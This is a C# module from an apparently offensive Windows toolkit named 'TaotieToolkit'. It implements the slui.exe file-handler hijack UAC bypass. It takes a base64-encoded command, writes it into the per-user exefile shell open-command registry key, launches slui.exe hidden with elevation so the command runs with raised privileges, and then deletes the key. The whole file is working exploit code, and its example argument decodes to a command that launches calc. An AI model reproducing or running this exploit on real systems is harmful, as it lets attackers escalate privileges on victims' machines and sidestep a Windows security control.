using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using TaotieToolkit.config;

namespace TaotieToolkit.modules.PrivilegeEscalation
{
    internal class Slui : ICommand, ICommandMarker
    {
        public string Name => "Slui";
        public string Description => "Slui file handler hijack privilege escalation, Example:TaotieToolkit Slui Y21kIC9jIHN0YXJ0IGNhbGMuZXhl";

        public void Execute(string[] args)
        {
            //Credit: https://bytecode77.com/hacking/exploits/uac-bypass/slui-file-handler-hijack-privilege-escalation

            //Check if UAC is set to 'Always Notify'
            Utils.AlwaysNotify();

            byte[] encodedCommand = Convert.FromBase64String(args[0]);

            //Convert encoded command to a string
            string command = Encoding.UTF8.GetString(encodedCommand);

            //Set the registry key for eventvwr
            RegistryKey newkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
            newkey.CreateSubKey(@"exefile\Shell\Open\command");

            RegistryKey sluikey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\exefile\Shell\Open\command", true);
            sluikey.SetValue("", @command);
            sluikey.Close();

            //start fodhelper
            Process p = new Process();
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.FileName = "C:\\windows\\system32\\slui.exe";
            p.StartInfo.Verb = "runas";
            p.Start();

            //sleep 10 seconds to let the payload execute
            Thread.Sleep(10000);

            //Unset the registry
            newkey.DeleteSubKeyTree("exefile");
            return;
        }
    }
}
